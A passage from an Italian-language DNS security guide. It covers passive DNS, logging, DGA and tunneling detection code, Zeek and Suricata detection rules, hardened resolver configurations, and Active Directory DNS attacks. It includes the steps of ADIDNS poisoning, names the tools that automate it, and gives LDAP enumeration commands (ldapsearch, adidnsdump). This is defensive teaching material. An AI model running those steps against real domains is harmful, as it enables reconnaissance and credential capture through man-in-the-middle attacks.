**Malware domain feeds:** servizi come Abuse.ch URLhaus, SURBL, Spamhaus DBL, PhishTank, e feed commerciali (Recorded Future, DomainTools) forniscono liste aggiornate di domini associati a malware, phishing, e C2. L'integrazione con il resolver (via RPZ) permette il blocco automatico.

---

## 6. Monitoraggio DNS

### Passive DNS Collection

La passive DNS collection registra le coppie query-response DNS osservate nel traffico di rete senza interferire con la risoluzione. A differenza del query logging sul resolver (che registra solo le query ricevute), la passive DNS collection avviene tipicamente a livello di rete (tap, span port, o inline) e cattura l'intero scambio.

**Architettura tipica:**

```
Network tap / Span port
    │
    ↓
Sensor (Zeek, dnstap, passivedns)
    │
    ↓
Collector / Aggregator
    │
    ↓
Database (PostgreSQL, ClickHouse, Elasticsearch)
    │
    ↓
Query API / Web UI
```

**Strumenti e database:**

- **DNSDB (Farsight Security / DomainTools):** il piu' grande database di passive DNS commerciale. Contiene miliardi di record storici. Permette ricerche per dominio, IP, nameserver, con storicita' di anni. Strumento fondamentale per threat intelligence e incident response.
- **PassiveTotal (RiskIQ / Microsoft):** piattaforma di threat intelligence con componente passive DNS significativa. Include resolution history, WHOIS history, e trackers/components analysis.
- **CIRCL Passive DNS:** servizio gratuito operato dal CIRCL (Computer Incident Response Center Luxembourg). API pubblica per ricerche passive DNS.

### DNS Query Logging

**Logging sul resolver:**

```bash
# BIND — query logging
logging {
    channel query_log {
        file "/var/log/named/queries.log" versions 10 size 100m;
        severity info;
        print-time yes;
        print-category yes;
        print-severity yes;
    };
    category queries { query_log; };
};
```

```yaml
# Unbound — query logging
server:
    log-queries: yes
    log-replies: yes
    log-tag-queryreply: yes
    verbosity: 1
    logfile: "/var/log/unbound/queries.log"
```

**Logging al firewall / network:** i firewall next-generation (Palo Alto, Fortinet, pfSense con Suricata) possono loggare il traffico DNS in transito. Questo cattura anche le query che bypassano il resolver interno (es. client che usano 8.8.8.8 direttamente). L'analisi combinata resolver + firewall fornisce visibilita' completa.

### Anomaly Detection

**Query volume spikes:** un incremento improvviso nel volume di query DNS da una singola sorgente o verso un singolo dominio e' indicatore di potenziale C2 activity, DGA activation, o DNS tunneling. Baseline statistici (media, deviazione standard per fascia oraria) permettono il rilevamento automatico.

**Unusual record types:** query frequenti per record TXT, NULL, CNAME in successione rapida sono indicatori di DNS tunneling. In un profilo DNS normale, la maggioranza delle query sono A/AAAA con una percentuale minore di MX, SRV, PTR. Query TXT massive verso un singolo dominio sono fortemente sospette.

**Entropy analysis per DGA detection:**

L'entropia di Shannon del nome di dominio e' un indicatore efficace di DGA. Domini legittimi hanno entropia relativamente bassa (parole leggibili, pattern prevedibili). Domini DGA hanno entropia elevata (caratteri pseudo-casuali).

```python
#!/usr/bin/env python3
"""DNS DGA detector — entropia + n-gram analysis."""

import math
from collections import Counter
from typing import NamedTuple


class DomainAnalysis(NamedTuple):
    domain: str
    entropy: float
    consonant_ratio: float
    digit_ratio: float
    is_suspicious: bool


def shannon_entropy(label: str) -> float:
    """Calcola l'entropia di Shannon per una stringa."""
    if not label:
        return 0.0
    freq = Counter(label)
    length = len(label)
    return -sum(
        (count / length) * math.log2(count / length)
        for count in freq.values()
    )


def consonant_ratio(label: str) -> float:
    """Rapporto consonanti / lunghezza totale."""
    vowels = set("aeiou")
    consonants = sum(1 for c in label.lower() if c.isalpha() and c not in vowels)
    return consonants / len(label) if label else 0.0


def digit_ratio(label: str) -> float:
    """Rapporto cifre / lunghezza totale."""
    digits = sum(1 for c in label if c.isdigit())
    return digits / len(label) if label else 0.0


def analyze_domain(fqdn: str) -> DomainAnalysis:
    """Analizza un FQDN per indicatori DGA."""
    # Estrarre il second-level domain label
    parts = fqdn.rstrip(".").split(".")
    if len(parts) < 2:
        label = parts[0]
    else:
        label = parts[-2]  # second-level domain

    ent = shannon_entropy(label)
    cr = consonant_ratio(label)
    dr = digit_ratio(label)

    # Soglie empiriche — da calibrare sul proprio traffico
    suspicious = (
        ent > 3.5
        or (cr > 0.7 and len(label) > 8)
        or dr > 0.4
        or len(label) > 20
    )

    return DomainAnalysis(
        domain=fqdn,
        entropy=ent,
        consonant_ratio=cr,
        digit_ratio=dr,
        is_suspicious=suspicious,
    )


def main() -> None:
    """Esempio di analisi batch."""
    test_domains = [
        "google.com",             # legittimo
        "wikipedia.org",          # legittimo
        "xn3kf9a2bc7d.net",       # probabile DGA
        "a7f3bx9k2mq.com",       # probabile DGA
        "stackoverflow.com",      # legittimo
        "qwrtyp8x4mn2.info",     # probabile DGA
        "github.com",             # legittimo
    ]

    print(f"{'Domain':<30} {'Entropy':>8} {'Cons%':>7} {'Digit%':>7} {'Suspicious':>11}")
    print("-" * 70)

    for domain in test_domains:
        result = analyze_domain(domain)
        print(
            f"{result.domain:<30} {result.entropy:>8.3f} "
            f"{result.consonant_ratio:>7.3f} {result.digit_ratio:>7.3f} "
            f"{'  YES' if result.is_suspicious else '  no':>11}"
        )


if __name__ == "__main__":
    main()
```

### DNS Tunneling Detection

La detection del DNS tunneling richiede analisi multi-dimensionale:

**Payload analysis:** i dati codificati nel subdomain label producono label piu' lunghi del normale. La lunghezza media dei label in traffico DNS legittimo e' ~10-15 caratteri; nel tunneling, i label raggiungono il massimo di 63 caratteri. Il rapporto tra lunghezza del dominio completo e numero di label e' un indicatore efficace.

**Frequency analysis:** il DNS tunneling produce un volume di query anomalo verso un singolo dominio autoritativo. Un client che genera 100+ query/minuto verso `tunnel.attacker.com` con subdomain sempre diversi e' sospetto. Il rapporto tra query uniche e query totali per un singolo dominio parent e' un indicatore chiave.

**Lexical analysis:** i subdomain nei tunnel DNS hanno caratteristiche lessicali diverse dai nomi legittimi: assenza di parole del dizionario, distribuzione uniforme dei caratteri, alta entropia. N-gram analysis (bigram/trigram frequency) distingue efficacemente nomi generati meccanicamente da nomi leggibili.

### Real-Time DNS Monitoring con Zeek, Suricata, dnstap

**Zeek (ex Bro) — DNS tunneling detection script:**

```zeek
# dns-tunnel-detect.zeek
# Rileva potenziale DNS tunneling basato su volume e lunghezza query

module DNSTunnel;

export {
    redef enum Notice::Type += {
        DNS_Tunnel_Suspected,
        DNS_Tunnel_High_Volume,
    };

    ## Soglia di lunghezza media del subdomain label
    const label_len_threshold = 40 &redef;
    ## Soglia di query uniche per dominio parent in 5 minuti
    const unique_query_threshold = 100 &redef;
    ## Intervallo di analisi
    const analysis_interval = 5min &redef;
}

# Tabella per tracciare query per dominio parent per client
global query_tracker: table[addr, string] of set[string]
    &create_expire=analysis_interval;

event dns_request(c: connection, msg: dns_msg, query: string, qtype: count, qclass: count)
    {
    if ( |query| < 10 )
        return;

    local parts = split_string(query, /\./);
    if ( |parts| < 3 )
        return;

    # Estrarre il dominio parent (ultimi 2 label)
    local parent = fmt("%s.%s", parts[|parts|-2], parts[|parts|-1]);

    # Controllare lunghezza del primo label (subdomain)
    local first_label = parts[0];
    if ( |first_label| > label_len_threshold )
        {
        NOTICE([$note=DNS_Tunnel_Suspected,
                $msg=fmt("Long DNS subdomain label from %s: %s (%d chars)",
                         c$id$orig_h, query, |first_label|),
                $conn=c,
                $identifier=cat(c$id$orig_h, parent)]);
        }

    # Tracciare query uniche per dominio parent
    local key = [c$id$orig_h, parent];
    if ( key !in query_tracker )
        query_tracker[key] = set();
    add query_tracker[key][query];

    if ( |query_tracker[key]| > unique_query_threshold )
        {
        NOTICE([$note=DNS_Tunnel_High_Volume,
                $msg=fmt("High unique DNS query volume from %s to %s: %d queries",
                         c$id$orig_h, parent, |query_tracker[key]|),
                $conn=c,
                $identifier=cat(c$id$orig_h, parent)]);
        delete query_tracker[key];
        }
    }
```

**Suricata — DNS detection rules:**

```yaml
# /etc/suricata/rules/dns-security.rules

# DNS tunneling — long subdomain labels
alert dns any any -> any any (msg:"DNS Tunnel - Excessively long subdomain label"; \
    dns.query; content:"."; offset:50; \
    sid:3000001; rev:1; \
    classtype:policy-violation; \
    metadata:created_at 2026_05_07;)

# DNS tunneling — TXT query flood to single domain
alert dns any any -> any any (msg:"DNS Tunnel - TXT query burst"; \
    dns.query; dns.opcode:0; \
    content:"."; \
    threshold:type both, track by_src, count 50, seconds 60; \
    sid:3000002; rev:1; \
    classtype:policy-violation;)

# DGA detection — high entropy domain
alert dns any any -> any any (msg:"DNS DGA - Suspicious domain length"; \
    dns.query; pcre:"/^[a-z0-9]{15,63}\./i"; \
    sid:3000003; rev:1; \
    classtype:trojan-activity;)

# DNS zone transfer attempt
alert dns any any -> any 53 (msg:"DNS Zone Transfer Attempt (AXFR)"; \
    dns.opcode:0; content:"|00 FC|"; offset:12; \
    sid:3000004; rev:1; \
    classtype:attempted-recon;)

# DNS query for known C2 TXT record pattern
alert dns any any -> any any (msg:"DNS C2 - Base64 in TXT query"; \
    dns.query; pcre:"/^[A-Za-z0-9+\/=]{20,}\./"; \
    sid:3000005; rev:1; \
    classtype:trojan-activity;)

# Detect iodine DNS tunnel
alert dns any any -> any any (msg:"DNS Tunnel - Possible iodine tunnel"; \
    dns.query; content:"."; pcre:"/^[a-f0-9]{16,}\./"; \
    threshold:type both, track by_src, count 20, seconds 30; \
    sid:3000006; rev:1; \
    classtype:policy-violation;)

# Detect DNS query to known malicious TLD
alert dns any any -> any any (msg:"DNS - Query to suspicious TLD"; \
    dns.query; content:".top"; isdataat:!1,relative; \
    sid:3000007; rev:1; \
    classtype:policy-violation;)
```

**dnstap:** protocollo di logging DNS ad alte prestazioni (RFC draft) supportato da BIND, Unbound, Knot, PowerDNS. A differenza del query logging testuale, dnstap utilizza Protocol Buffers per serializzazione binaria efficiente, riducendo l'overhead sul resolver del 90%+ rispetto al query logging tradizionale. L'output dnstap viene inviato a un collector (es. `dnstap-ldns`, `golang-dnstap`, `fstrm_capture`) per archiviazione e analisi.

```yaml
# Unbound dnstap configuration
server:
    module-config: "dnstap validator iterator"

dnstap:
    dnstap-enable: yes
    dnstap-socket-path: "/var/run/unbound/dnstap.sock"
    dnstap-send-identity: yes
    dnstap-send-version: yes
    dnstap-log-resolver-query-messages: yes
    dnstap-log-resolver-response-messages: yes
    dnstap-log-client-query-messages: yes
    dnstap-log-client-response-messages: yes
```

---

## 7. DNS Infrastructure Hardening

### BIND Security Configuration

BIND (Berkeley Internet Name Domain) e' il server DNS piu' diffuso. La configurazione di sicurezza richiede attenzione a molteplici vettori di attacco. Di seguito una configurazione `named.conf` hardened con views, ACLs, rate limiting, e recursion control.

```bind
// /etc/bind/named.conf — hardened configuration

// ACL definitions
acl "trusted-nets" {
    10.0.0.0/8;
    172.16.0.0/12;
    192.168.0.0/16;
    localhost;
    localnets;
};

acl "transfer-peers" {
    10.0.1.2;     // secondary NS 1
    10.0.1.3;     // secondary NS 2
};

// Global options
options {
    directory "/var/cache/bind";
    pid-file "/run/named/named.pid";

    // Bind to specific interfaces only
    listen-on    { 10.0.0.1; 127.0.0.1; };
    listen-on-v6 { ::1; };

    // Disable recursion globally — enable only in internal view
    recursion no;
    additional-from-auth no;
    additional-from-cache no;

    // Disable zone transfers globally
    allow-transfer { none; };

    // Disable dynamic updates globally
    allow-update { none; };

    // Disable NOTIFY to reduce info leak
    notify no;

    // Hide version string
    version "not disclosed";
    hostname none;
    server-id none;

    // DNSSEC validation
    dnssec-validation auto;

    // Source port randomization (anti-cache-poisoning)
    use-v4-udp-ports { range 1024 65535; };
    use-v6-udp-ports { range 1024 65535; };

    // Minimize responses
    minimal-responses yes;
    minimal-any yes;

    // Rate limiting (Response Rate Limiting)
    rate-limit {
        responses-per-second 10;
        referrals-per-second 5;
        nodata-per-second 5;
        nxdomains-per-second 5;
        errors-per-second 5;
        all-per-second 50;
        window 15;
        slip 2;
        qps-scale 250;
        ipv4-prefix-length 24;
        ipv6-prefix-length 56;
    };

    // Fetch limits per server/zone
    fetches-per-server 10 drop;
    fetches-per-zone 10 drop;

    // Maximum cache size
    max-cache-size 256m;

    // Limit recursive clients
    recursive-clients 5000;
    tcp-clients 200;
};

// Logging
logging {
    channel security_log {
        file "/var/log/named/security.log" versions 10 size 50m;
        severity info;
        print-time yes;
        print-category yes;
    };

    channel query_log {
        file "/var/log/named/queries.log" versions 10 size 200m;
        severity info;
        print-time yes;
    };

    channel xfer_log {
        file "/var/log/named/transfers.log" versions 5 size 20m;
        severity info;
        print-time yes;
    };

    category security { security_log; };
    category queries  { query_log; };
    category xfer-in  { xfer_log; };
    category xfer-out { xfer_log; };
};

// Internal view — recursion enabled for trusted networks
view "internal" {
    match-clients { "trusted-nets"; };
    match-destinations { "trusted-nets"; };

    recursion yes;
    allow-query { "trusted-nets"; };
    allow-recursion { "trusted-nets"; };
    allow-query-cache { "trusted-nets"; };

    // RPZ for malware blocking
    response-policy {
        zone "rpz.malware-block"
            policy given
            recursive-only yes
            max-policy-ttl 300;
    };

    zone "rpz.malware-block" {
        type master;
        file "/etc/bind/zones/rpz.malware-block.zone";
        allow-query { none; };  // RPZ zone not directly queryable
    };

    // Internal zones
    zone "internal.example.com" {
        type master;
        file "/etc/bind/zones/internal.example.com.zone";
        allow-transfer { "transfer-peers"; };
        allow-update { none; };
        notify yes;
        also-notify { 10.0.1.2; 10.0.1.3; };
    };

    // Forward zone per external resolution
    zone "." {
        type hint;
        file "/usr/share/dns/root.hints";
    };
};

// External view — authoritative only, no recursion
view "external" {
    match-clients { any; };
    match-destinations { any; };

    recursion no;
    allow-query { any; };

    zone "example.com" {
        type master;
        file "/etc/bind/zones/example.com.zone.signed";
        allow-transfer { "transfer-peers"; };
        allow-update { none; };
    };
};
```

### Unbound Hardening

Unbound e' un recursive resolver progettato con la sicurezza come priorita'. La sua architettura non include un authoritative server component, riducendo la superficie d'attacco.

```yaml
# /etc/unbound/unbound.conf — hardened configuration

server:
    # Interface binding
    interface: 10.0.0.1
    interface: 127.0.0.1
    port: 53

    # Access control — deny all, then allow trusted
    access-control: 0.0.0.0/0 refuse
    access-control: 127.0.0.0/8 allow
    access-control: 10.0.0.0/8 allow
    access-control: 172.16.0.0/12 allow
    access-control: 192.168.0.0/16 allow

    # DNSSEC validation
    auto-trust-anchor-file: "/var/lib/unbound/root.key"
    val-clean-additional: yes
    val-permissive-mode: no
    val-log-level: 1

    # Privacy and minimization
    qname-minimisation: yes
    qname-minimisation-strict: no  # strict puo' rompere domini mal configurati
    minimal-responses: yes
    rrset-roundrobin: yes

    # Hardening options
    hide-identity: yes
    hide-version: yes
    harden-glue: yes
    harden-dnssec-stripped: yes
    harden-below-nxdomain: yes
    harden-referral-path: yes
    harden-algo-downgrade: yes
    harden-large-queries: yes
    harden-short-bufsize: yes
    use-caps-for-id: yes          # 0x20-bit encoding anti-spoofing

    # Aggressive NSEC (RFC 8198)
    aggressive-nsec: yes

    # Rate limiting
    ip-ratelimit: 100             # queries per second per client IP
    ratelimit: 1000               # queries per second per domain

    # Resource limits
    num-threads: 4
    msg-cache-size: 128m
    rrset-cache-size: 256m
    key-cache-size: 32m
    neg-cache-size: 16m
    cache-max-ttl: 86400
    cache-min-ttl: 0
    infra-cache-numhosts: 50000
    outgoing-range: 8192
    num-queries-per-thread: 4096

    # Unwanted reply threshold — detect cache poisoning attempts
    unwanted-reply-threshold: 10000000

    # Private address ranges — block rebinding attacks
    private-address: 10.0.0.0/8
    private-address: 172.16.0.0/12
    private-address: 192.168.0.0/16
    private-address: 169.254.0.0/16
    private-address: fd00::/8
    private-address: fe80::/10

    # DoT upstream (privacy)
    # Commento: usare solo se upstream supporta DoT
    # forward-zone:
    #     name: "."
    #     forward-tls-upstream: yes
    #     forward-addr: 1.1.1.1@853#cloudflare-dns.com
    #     forward-addr: 9.9.9.9@853#dns.quad9.net

    # Logging (abilitare per troubleshooting, disabilitare in produzione)
    # log-queries: yes
    # log-replies: yes
    verbosity: 1
    logfile: "/var/log/unbound/unbound.log"
    log-time-ascii: yes
    log-servfail: yes

    # chroot per isolamento (richiede setup directory)
    # chroot: "/etc/unbound"

    # Drop privileges
    username: "unbound"
    directory: "/etc/unbound"

    # Prefetch per ridurre latenza
    prefetch: yes
    prefetch-key: yes

    # Serve expired records while fetching new ones
    serve-expired: yes
    serve-expired-ttl: 86400

# Remote control (protetto da TLS mutual auth)
remote-control:
    control-enable: yes
    control-interface: 127.0.0.1
    control-port: 8953
    server-key-file: "/etc/unbound/unbound_server.key"
    server-cert-file: "/etc/unbound/unbound_server.pem"
    control-key-file: "/etc/unbound/unbound_control.key"
    control-cert-file: "/etc/unbound/unbound_control.pem"
```

### PowerDNS Security

PowerDNS Authoritative Server richiede attenzione specifica per l'API REST (introdotta in v4) e le zone transfer.

```ini
# /etc/powerdns/pdns.conf — hardened

# General
setuid=pdns
setgid=pdns
daemon=yes

# API hardening — CRITICAL: change default key
api=yes
api-key=CHANGE_THIS_TO_A_STRONG_RANDOM_KEY_64CHARS
webserver=yes
webserver-address=127.0.0.1
webserver-port=8081
webserver-allow-from=127.0.0.1,10.0.0.0/24
webserver-password=CHANGE_THIS_ALSO

# Zone transfer restrictions
disable-axfr=no
allow-axfr-ips=10.0.1.2/32,10.0.1.3/32
allow-dnsupdate-from=
allow-notify-from=10.0.1.2/32,10.0.1.3/32

# DNSSEC
default-soa-content=ns1.example.com admin.example.com 0 10800 3600 604800 3600

# Security
security-poll-suffix=
# Disable version query
version-string=anonymous

# Logging
log-dns-details=yes
log-dns-queries=yes
loglevel=4
```

### Windows DNS Server Hardening

```powershell
# Windows DNS Server hardening via PowerShell

# Enable DNS socket pool (anti-cache-poisoning)
# Increases source port randomization pool
Set-DnsServerSetting -SocketPoolSize 10000

# Enable cache locking
# Prevents cache records from being overwritten before TTL expires
Set-DnsServerCache -LockingPercent 100

# Response Rate Limiting (Windows Server 2016+)
Set-DnsServerResponseRateLimiting -Mode Enable `
    -ResponsesPerSec 5 `
    -ErrorsPerSec 5 `
    -WindowInSec 7 `
    -LeakRate 3

# Disable recursion on authoritative-only servers
Set-DnsServerRecursion -Enable $false

# Restrict zone transfers
Set-DnsServerZoneTransferPolicy -Name "example.com" `
    -AllowTransfer NamedServers

# Enable DNS logging
Set-DnsServerDiagnostics -All $true `
    -EnableLoggingToFile $true `
    -LogFilePath "C:\DNS_Logs\dns.log" `
    -MaxMBFileSize 500
```

### Split-Horizon DNS Architecture

La split-horizon DNS (split-brain DNS) utilizza views/policy per servire risposte diverse in base alla sorgente della query. I client interni ricevono IP interni; i client esterni ricevono IP pubblici. Questo:

- Nasconde la topologia interna agli utenti esterni
- Permette risoluzione diretta ai servizi interni senza hairpin NAT
- Richiede manutenzione attenta per evitare desync tra le views

La configurazione BIND con `view "internal"` e `view "external"` nella sezione precedente implementa esattamente questo pattern. L'errore piu' comune e' dimenticare di aggiornare entrambe le views quando si modifica un record, causando risoluzione inconsistente tra client interni ed esterni.

---

## 8. DNS e Active Directory

### AD-Integrated DNS Zones

In Active Directory, le zone DNS possono essere integrate nella directory LDAP (AD-integrated zones). Questo offre vantaggi operativi significativi (replicazione multi-master automatica, sicurezza basata su ACL LDAP, eliminazione della configurazione di zone transfer separata) ma introduce vettori di attacco specifici.

Le zone AD-integrated sono memorizzate come oggetti nella partizione `CN=MicrosoftDNS,DC=DomainDnsZones,DC=domain,DC=com` (o `ForestDnsZones` per zone forest-wide). L'accesso a questi oggetti segue le ACL LDAP standard, ma la configurazione di default e' permissiva.

**Implicazioni di sicurezza:**
- Qualsiasi domain user autenticato puo' leggere tutti i record DNS dalla directory LDAP — equivalente a un zone transfer automatico
- Gli oggetti DNS in LDAP sono modificabili da utenti con permessi di scrittura sulla partizione — potenzialmente qualsiasi authenticated user per i record non preesistenti
- La replicazione DNS segue la topologia di replicazione AD — un domain controller compromesso in un sito remoto compromette anche il DNS

### SRV Record Manipulation

Active Directory utilizza estensivamente i record SRV per il service discovery: `_ldap._tcp.dc._msdcs.domain.com`, `_kerberos._tcp.dc._msdcs.domain.com`, `_gc._tcp.forest.com`. La manipolazione di questi record permette attacchi di redirezione dei servizi AD:

- **DC redirection:** modificando il record SRV per `_ldap._tcp`, un attaccante puo' redirigere i client verso un rogue domain controller che cattura credenziali NTLM/Kerberos
- **Kerberos hijacking:** la modifica del record SRV per `_kerberos._tcp` redirige le richieste Kerberos verso un KDC controllato, permettendo Kerberoasting massivo o credential theft
- **Global Catalog poisoning:** record SRV per `_gc._tcp` redirigono le ricerche cross-domain

### ADIDNS Poisoning

L'ADIDNS poisoning e' un attacco specifico agli ambienti Active Directory che sfrutta i permessi LDAP default per creare record DNS malevoli. A differenza della modifica dei record esistenti (che richiede permessi elevati), la creazione di nuovi record DNS e' consentita di default a tutti gli authenticated users.

**Meccanismo dell'attacco:**

1. L'attaccante (authenticated domain user) identifica un nome DNS non ancora registrato ma potenzialmente utilizzato (es. WPAD — Web Proxy Auto-Discovery)
2. Via LDAP, crea un oggetto `dnsNode` nella partizione `DomainDnsZones`:
   ```
   DN: DC=wpad,DC=domain.com,CN=MicrosoftDNS,DC=DomainDnsZones,DC=domain,DC=com
   objectClass: dnsNode
   dnsRecord: [binary blob contenente A record 10.0.0.attacker]
   ```
3. I client che risolvono `wpad.domain.com` ricevono l'IP dell'attaccante
4. Il rogue WPAD server distribuisce configurazione proxy malevola, permettendo MITM su tutto il traffico HTTP

**Tool:** `Powermad` (PowerShell), `dnstool.py` (Impacket suite), `SharpDNS` automatizzano l'ADIDNS poisoning.

**Mitigazione:** disabilitare WPAD via GPO, rimuovere i permessi di creazione record DNS per authenticated users, pre-registrare nomi sensibili (wpad, isatap, autodiscover), monitorare la creazione di nuovi record DNS via event logging.

### Dynamic Update Security — GSS-TSIG

Le dynamic DNS updates (RFC 2136) permettono ai client di aggiornare il proprio record DNS autonomamente. In ambienti AD, la sicurezza delle dynamic updates e' gestita da GSS-TSIG (RFC 3645), che utilizza Kerberos per autenticare gli aggiornamenti.

**Configurazione sicura delle dynamic updates:**

- Impostare le zone su "Secure only" (solo aggiornamenti autenticati via GSS-TSIG)
- Non utilizzare mai "Nonsecure and secure" — permette aggiornamenti non autenticati
- Configurare aging/scavenging per rimuovere automaticamente i record stale
- Monitorare i permessi sugli oggetti DNS in LDAP — i client che creano record diventano owner con full control

### DNS Zone Transfer da AD — Information Disclosure

Il zone transfer da zone AD-integrated e' particolarmente pericoloso perche' espone non solo i record DNS standard ma potenzialmente anche metadati AD. Qualsiasi domain user puo' enumerare i record DNS via LDAP senza necessita' di AXFR:

```bash
# Enumerazione DNS via LDAP (non richiede permessi AXFR)
ldapsearch -H ldap://dc.domain.com -b "DC=domain.com,CN=MicrosoftDNS,DC=DomainDnsZones,DC=domain,DC=com" \
    -D "user@domain.com" -W "(objectClass=dnsNode)" dnsRecord name

# Con adidnsdump (tool specializzato)
adidnsdump -u domain\\user -p password ldap://dc.domain.com
```

### Forest Trust DNS Forwarding Security

In ambienti multi-forest, i conditional forwarder DNS collegano i namespace DNS dei forest. Un forwarder mal configurato puo':

- Esporre i record DNS interni di un forest agli utenti dell'altro
- Permettere DNS poisoning cross-forest
- Creare dipendenze di risoluzione che bypassano i trust boundary

La configurazione sicura prevede: conditional forwarder unidirezionali, DNSSEC validation sui forwarder, monitoring del traffico DNS cross-forest, e revisione periodica dei trust relationship.

---

## 9. DNS Threat Intelligence

### DGA Detection — Tecniche Avanzate

I Domain Generation Algorithm (DGA) sono classificabili in categorie con approcci di detection diversi:

**Arithmetic-based DGA (es. Conficker, CryptoLocker):** generano domini con operazioni aritmetiche su seed temporali (data corrente, hash). Producono domini con distribuzione di caratteri uniforme, alta entropia, nessuna somiglianza con parole naturali. Detection: analisi di entropia e frequenza n-gram sono altamente efficaci.

**Dictionary-based DGA (es. Suppobox, Matsnu):** combinano parole del dizionario per produrre domini dall'aspetto piu' naturale (`horse-battery-staple.com`). Entropia piu' bassa, lunghezza variabile, possibili colpi su word-list. Detection: la frequenza di query unico dominio, la distribuzione dei TLD, e l'eta' del dominio (NRD — Newly Registered Domain) sono indicatori piu' efficaci dell'entropia per questa categoria.

**Hash-based DGA:** utilizzano funzioni hash (MD5, SHA) per generare nomi. Producono stringhe esadecimali riconoscibili (`a3f7b2c1d4e5.com`). Detection: regex per pattern esadecimali + lunghezza.

**Encoder-based DGA:** utilizzano encoding (Base32, custom alphabet) per trasformare dati in nomi di dominio. Producono pattern specifici dell'encoding utilizzato. Detection: analisi della distribuzione dei caratteri per identificare l'encoding.

**Script Python per DGA detection pipeline:**

```python
#!/usr/bin/env python3
"""Pipeline di analisi DNS per rilevamento DGA e tunneling.

Legge query DNS da stdin (formato: timestamp,client_ip,query_name,query_type)
e produce alert su stdout.
"""

import sys
import math
from collections import Counter, defaultdict
from dataclasses import dataclass, field
from datetime import datetime
from typing import TextIO


VOWELS = set("aeiouAEIOU")
COMMON_TLDS = {"com", "net", "org", "edu", "gov", "io", "co", "uk", "de", "it"}
WHITELIST_DOMAINS = {
    "google.com", "googleapis.com", "gstatic.com",
    "microsoft.com", "windows.net", "azure.com",
    "amazonaws.com", "cloudfront.net",
    "apple.com", "icloud.com",
    "cloudflare.com",
}


@dataclass
class DomainStats:
    query_count: int = 0
    unique_subdomains: set = field(default_factory=set)
    total_label_length: int = 0
    first_seen: str = ""
    last_seen: str = ""
    txt_queries: int = 0
    null_queries: int = 0


def shannon_entropy(s: str) -> float:
    if not s:
        return 0.0
    freq = Counter(s)
    length = len(s)
    return -sum((c / length) * math.log2(c / length) for c in freq.values())


def extract_parent_domain(fqdn: str) -> str:
    parts = fqdn.rstrip(".").split(".")
    if len(parts) >= 2:
        return f"{parts[-2]}.{parts[-1]}"
    return fqdn


def is_whitelisted(domain: str) -> bool:
    for w in WHITELIST_DOMAINS:
        if domain == w or domain.endswith(f".{w}"):
            return True
    return False


def analyze_stream(
    stream: TextIO,
    entropy_threshold: float = 3.5,
    tunnel_query_threshold: int = 80,
    tunnel_label_len_threshold: int = 35,
) -> None:
    domain_stats: dict[str, DomainStats] = defaultdict(DomainStats)
    alert_count = 0

    for line in stream:
        line = line.strip()
        if not line or line.startswith("#"):
            continue

        parts = line.split(",")
        if len(parts) < 4:
            continue

        timestamp, client_ip, query_name, query_type = parts[0], parts[1], parts[2], parts[3]
        parent = extract_parent_domain(query_name)

        if is_whitelisted(parent):
            continue

        stats = domain_stats[f"{client_ip}|{parent}"]
        stats.query_count += 1
        if not stats.first_seen:
            stats.first_seen = timestamp
        stats.last_seen = timestamp

        # Track subdomain
        subdomain = query_name.replace(f".{parent}", "")
        if subdomain != query_name:
            stats.unique_subdomains.add(subdomain)
            stats.total_label_length += len(subdomain)

        if query_type.upper() == "TXT":
            stats.txt_queries += 1
        elif query_type.upper() in ("NULL", "TYPE10"):
            stats.null_queries += 1

        # Real-time DGA check on the second-level label
        sld_parts = query_name.rstrip(".").split(".")
        if len(sld_parts) >= 2:
            sld = sld_parts[-2]
            ent = shannon_entropy(sld)
            if ent > entropy_threshold and len(sld) > 10:
                alert_count += 1
                print(
                    f"[DGA] {timestamp} client={client_ip} "
                    f"domain={query_name} entropy={ent:.2f} len={len(sld)}"
                )

        # Periodic tunnel check
        if stats.query_count % tunnel_query_threshold == 0:
            unique_count = len(stats.unique_subdomains)
            avg_label = (
                stats.total_label_length / unique_count if unique_count else 0
            )
            if unique_count > tunnel_query_threshold and avg_label > tunnel_label_len_threshold:
                alert_count += 1
                print(
                    f"[TUNNEL] {timestamp} client={client_ip} "
                    f"parent={parent} unique_subs={unique_count} "
                    f"avg_label_len={avg_label:.1f} "
                    f"txt_queries={stats.txt_queries}"
                )

    # Summary
    print(f"\n--- Analysis complete: {alert_count} alerts generated ---", file=sys.stderr)


if __name__ == "__main__":
    analyze_stream(sys.stdin)
```

### Newly Registered Domain (NRD) Monitoring

I domini appena registrati sono sproporzionatamente utilizzati per phishing, malware distribution, e C2. Il monitoring NRD consiste nel:

1. Acquisire feed di NRD (WHOIS data stream, zone file access programs per gTLD)
2. Analizzare i nuovi domini per indicatori di abuso: registrar a basso costo, WHOIS privacy, TLD sospetti, pattern di naming DGA-like
3. Applicare policy: quarantena DNS (blocco per le prime 24-48 ore dalla registrazione) o alert per accesso a NRD

### DNS-Based Threat Hunting

**TTL anomalies:** record con TTL anomali meritano investigazione. TTL < 60s per domini non-CDN suggerisce fast-flux. TTL = 0 suggerisce DNS rebinding. TTL estremamente alti (> 1 settimana) per domini sconosciuti suggeriscono cache persistence attack.

**Answer section analysis:** risposte DNS con IP in range inusuali per il dominio richiesto (es. un dominio `.it` che risolve a un IP in un ASN dell'Asia centrale) sono sospette. L'analisi GeoIP e ASN delle risposte, confrontata con il profilo atteso del dominio, rileva redirezioni malevole.

**Query pattern analysis:** pattern temporali anomali (query regolari ogni N secondi = beaconing), query concentrate in orari non lavorativi, query da server che normalmente non effettuano DNS lookup (database server, storage) sono indicatori di compromissione.

### Building DNS Threat Intelligence Pipeline

```
Data Sources              Processing              Action
─────────────            ──────────              ──────
Resolver query logs ──→  Normalization  ──→  ELK/Splunk ingest
Firewall DNS logs  ──→  Enrichment     ──→  Correlation rules
Passive DNS feeds  ──→  (GeoIP, ASN,   ──→  SIEM alerts
Threat intel feeds ──→   WHOIS, NRD)   ──→  SOAR playbooks
Zeek DNS logs      ──→  ML/Anomaly     ──→  RPZ auto-update
                        detection       ──→  SOC dashboard
```

### Integrazione con SIEM/SOAR

L'integrazione del DNS monitoring con SIEM (Splunk, Elastic SIEM, Wazuh) e SOAR (Cortex XSOAR, Shuffle, Tines) permette risposta automatica:

1. **Detection:** regola SIEM rileva DGA/tunneling/beaconing
2. **Enrichment:** SOAR interroga threat intel (VirusTotal, DNSDB, WHOIS) per il dominio sospetto
3. **Triage:** score di rischio calcolato da threat intel response
4. **Response automatica:** se score > soglia, SOAR aggiorna automaticamente la RPZ zone per bloccare il dominio e notifica il SOC
5. **Containment:** se il client sorgente e' identificato come compromesso, SOAR triggera l'isolamento della macchina via EDR API

---

## 10. Laboratorio

